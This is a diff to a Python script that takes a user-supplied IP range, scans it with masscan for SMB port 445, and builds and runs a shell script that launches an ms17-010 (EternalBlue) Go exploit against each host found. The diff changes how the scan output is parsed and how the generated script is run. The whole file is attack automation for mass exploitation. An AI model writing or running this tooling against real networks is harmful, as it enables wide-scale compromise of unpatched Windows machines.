@@ -24,7 +24,9 @@ print("")
 ip = raw_input("WHAT IS THE SCAN RANGE (example 196.168.0.0/12):  ")
 type(ip)
 
-os.system('masscan -p445,445 ' + ip +' --rate=10000 | grep "Dis" | cut -b 33,34,35,36,37,38,39,40,41,42,43,44,45,46,47 | sed  -e '+"'s/^/go run ignore.go/'" + "> /root/scan2.sh")
+os.system('masscan -p445,445 ' + ip +' --rate=10000 > out.txt' )
+
+os.system("cat out.txt | grep Dis | cut -b 33,34,35,36,37,38,39,40,41,42,43,44,45,46,47 | sed  -e 's/^/go run ms17-010.go -h /' > scan2.sh")
 
 os.system('clear')
 
@@ -43,4 +45,4 @@ print('..........................................\__|...........................
 
 os.system('chmod 777 scan2.sh')
 
-os.system('./scan2.sh')
+os.system('bash scan2.sh')
